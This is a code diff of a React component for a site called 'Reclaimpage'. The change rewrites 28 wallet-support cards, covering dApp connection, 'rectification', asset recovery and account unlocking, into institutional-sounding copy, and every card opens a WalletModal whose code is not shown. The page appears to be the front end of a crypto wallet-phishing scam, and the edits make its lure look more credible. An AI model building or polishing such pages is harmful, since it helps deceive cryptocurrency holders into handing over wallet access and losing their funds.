@@ -31,62 +31,62 @@ import {
 import { WalletModal } from "@/components/WalletModal";
 
 const features = [
-  { icon: LinkIcon, title: "Connect to Dapps", desc: "Click here for error while connecting to Dapps." },
-  { icon: Lock, title: "Validation", desc: "Click here for validation." },
-  { icon: ShieldCheck, title: "Rectification", desc: "Click here for rectification." },
-  { icon: Package, title: "Claim Airdrop", desc: "Click here to claim Airdrop." },
-  { icon: CircleDollarSign, title: "Buy Token", desc: "Click here to buy tokens." },
-  { icon: LogIn, title: "Login", desc: "Click here for login related issues." },
-  { icon: ArrowLeftRight, title: "Migration", desc: "Click here for token migration." },
-  { icon: RotateCcw, title: "Restore", desc: "Click here for restoration related issues." },
-  { icon: Shield, title: "Reflection", desc: "Click here for issues related to reflection." },
-  { icon: LifeBuoy, title: "Assets Recovery", desc: "Click here for assets recovery issues." },
-  { icon: LineChart, title: "High Gas Fees", desc: "Click here for gas fee related issues." },
-  { icon: Wallet, title: "Claim Presale Token", desc: "Click here to claim presale token related issues." },
-  { icon: MessageSquare, title: "Slippage Error", desc: "Click here for slippage related error during trade." },
-  { icon: Box, title: "Transaction Error", desc: "Click here for transaction related issues." },
-  { icon: Layers, title: "Staking Issues", desc: "click here for staking related issues." },
-  { icon: ArrowLeftRight, title: "Swap/Exchange", desc: "Click here for swap/exchange related issues." },
-  { icon: Share2, title: "Cross Chain Transfer", desc: "Click here for gas fee related issues." },
-  { icon: LogOut, title: "Login Issues", desc: "Click here for issues while logging into your wallet." },
-  { icon: Disc, title: "Claim Airdrop", desc: "Click here for airdrop related issues." },
-  { icon: Image, title: "NFTs Issues", desc: "Click here for NFTs minting transfer related issues." },
-  { icon: Coins, title: "Missing/ Irregular Balance", desc: "Click here to recover lost missing funds." },
-  { icon: ListChecks, title: "Whitelist", desc: "Click here for whitelist related issues." },
-  { icon: Timer, title: "Transaction Delay", desc: "Click here for any issues related to transaction delayed." },
-  { icon: Truck, title: "Migration Issues", desc: "Click here for migration related issues." },
-  { icon: ShoppingBag, title: "Trading Wallet", desc: "Click here if you have problem with your trading wallet." },
-  { icon: BadgeDollarSign, title: "Can't Buy Coins/Tokens", desc: "To trade crypto your account must be marked as a trusted payment source." },
-  { icon: Lock, title: "Locked Account", desc: "Click here for issues related to account lock." },
-  { icon: MessagesSquare, title: "Other Issues Not Listed", desc: "If you can't find the issue you are experiencing click here." },
+  { icon: LinkIcon, title: "Connect to Dapps", desc: "Enterprise resolution for dApp connectivity failures." },
+  { icon: Lock, title: "Validation", desc: "Institutional-grade cryptographic validation protocols." },
+  { icon: ShieldCheck, title: "Rectification", desc: "Automated smart contract and state rectification." },
+  { icon: Package, title: "Claim Airdrop", desc: "Secure multi-network token claim orchestration." },
+  { icon: CircleDollarSign, title: "Buy Token", desc: "Streamlined payment gateway for asset acquisition." },
+  { icon: LogIn, title: "Login", desc: "Credential recovery and secure auth troubleshooting." },
+  { icon: ArrowLeftRight, title: "Migration", desc: "Zero-loss automated asset migration engines." },
+  { icon: RotateCcw, title: "Restore", desc: "Deep recovery for lost or corrupted wallet states." },
+  { icon: Shield, title: "Reflection", desc: "Dividend and reflection tracking infrastructure." },
+  { icon: LifeBuoy, title: "Assets Recovery", desc: "Specialized recovery for misrouted digital assets." },
+  { icon: LineChart, title: "High Gas Fees", desc: "Gas-optimized execution for cost-effective operations." },
+  { icon: Wallet, title: "Claim Presale Token", desc: "Automated vesting and presale claim management." },
+  { icon: MessageSquare, title: "Slippage Error", desc: "Low-latency trading and slippage optimization." },
+  { icon: Box, title: "Transaction Error", desc: "Real-time diagnostic and recovery for failed txns." },
+  { icon: Layers, title: "Staking Issues", desc: "Yield optimization and staking protocol resolution." },
+  { icon: ArrowLeftRight, title: "Swap/Exchange", desc: "Secure cross-DEX asset swapping infrastructure." },
+  { icon: Share2, title: "Cross Chain Transfer", desc: "Multi-bridge liquidity routing and management." },
+  { icon: LogOut, title: "Login Issues", desc: "Session recovery and multi-device auth troubleshooting." },
+  { icon: Disc, title: "Claim Airdrop", desc: "Ecosystem-wide distribution event management." },
+  { icon: Image, title: "NFTs Issues", desc: "NFT minting, transfer, and metadata resolution." },
+  { icon: Coins, title: "Missing/ Irregular Balance", desc: "Ledger reconciliation and fund recovery." },
+  { icon: ListChecks, title: "Whitelist", desc: "Allocation management and whitelist validation." },
+  { icon: Timer, title: "Transaction Delay", desc: "Network latency monitoring and acceleration." },
+  { icon: Truck, title: "Migration Issues", desc: "Large-scale institutional asset migrations." },
+  { icon: ShoppingBag, title: "Trading Wallet", desc: "Advanced terminal for professional trading operations." },
+  { icon: BadgeDollarSign, title: "Can't Buy Coins/Tokens", desc: "Payment source validation and trusted routing." },
+  { icon: Lock, title: "Locked Account", desc: "Security override and identity-based unlocking." },
+  { icon: MessagesSquare, title: "Other Issues Not Listed", desc: "Custom resolution for unique Web3 operational needs." },
 ];
 
 export function AdvantageGrid() {
   return (
-    <section id="advantage" className="py-24 lg:py-32 bg-obsidian relative">
+    <section id="advantage" className="py-24 lg:py-32 bg-[#070B12] relative">
       <div className="max-w-7xl mx-auto px-6 lg:px-8">
         <div className="text-center max-w-3xl mx-auto mb-20">
-          <h2 className="font-headline text-4xl md:text-5xl font-bold mb-6">
-            The <span className="text-primary">Reclaimpage</span> Advantage
+          <h2 className="font-headline text-4xl md:text-5xl font-bold mb-6 text-white leading-tight">
+            The <span className="bg-gradient-to-r from-[#10B981] to-[#34D399] bg-clip-text text-transparent">Reclaimpage</span> Advantage
           </h2>
-          <p className="text-slate-400 text-lg mb-8 leading-relaxed">
-            A premier enterprise-grade platform specializing in the comprehensive resolution of Web3 operational challenges. From identifying smart contract vulnerabilities to executing blockchain rectifications and complex dApp troubleshooting, we deliver rapid, secure, and automated infrastructure solutions for the decentralized ecosystem.
+          <p className="text-slate-400 text-lg mb-8 leading-relaxed font-body">
+            Professional resolution for high-stakes Web3 operations. We deliver automated, secure, and rapid infrastructure solutions for the decentralized ecosystem.
           </p>
-          <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-primary/10 border border-primary/20 text-primary text-[10px] font-bold uppercase tracking-[0.2em] animate-pulse">
-            <span className="w-2 h-2 rounded-full bg-primary animate-pulse"></span>
-            Make Your Selection Below
+          <div className="inline-flex items-center gap-2 px-5 py-2.5 rounded-full bg-[#10B981]/10 border border-[#10B981]/20 text-[#10B981] text-[10px] font-black uppercase tracking-[0.2em]">
+            <span className="w-1.5 h-1.5 rounded-full bg-[#10B981] animate-pulse"></span>
+            Select Operation to Proceed
           </div>
         </div>
 
         <div className="grid md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
           {features.map((feature, i) => (
-            <WalletModal key={i}>
-              <button className="glass group p-6 rounded-[2rem] hover:bg-white/5 transition-all duration-300 border-white/5 hover:border-primary/20 text-left w-full focus:outline-none focus:ring-2 focus:ring-primary/50">
-                <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform duration-300">
-                  <feature.icon className="text-primary w-6 h-6" />
+            <WalletModal key={feature.title}>
+              <button className="glass group p-8 rounded-[2rem] hover:bg-white/[0.04] transition-all duration-300 hover:scale-[1.02] text-left w-full focus:outline-none focus:ring-2 focus:ring-[#10B981]/30">
+                <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-[#10B981]/20 to-transparent flex items-center justify-center mb-6 border border-white/5 group-hover:border-[#10B981]/30 transition-all duration-300">
+                  <feature.icon className="text-[#10B981] w-6 h-6 group-hover:scale-110 transition-transform duration-300" />
                 </div>
-                <h3 className="font-headline text-lg font-bold mb-3">{feature.title}</h3>
-                <p className="text-slate-400 leading-relaxed text-xs">
+                <h3 className="font-headline text-lg font-bold mb-3 text-white">{feature.title}</h3>
+                <p className="text-slate-500 leading-relaxed text-xs font-medium">
                   {feature.desc}
                 </p>
               </button>
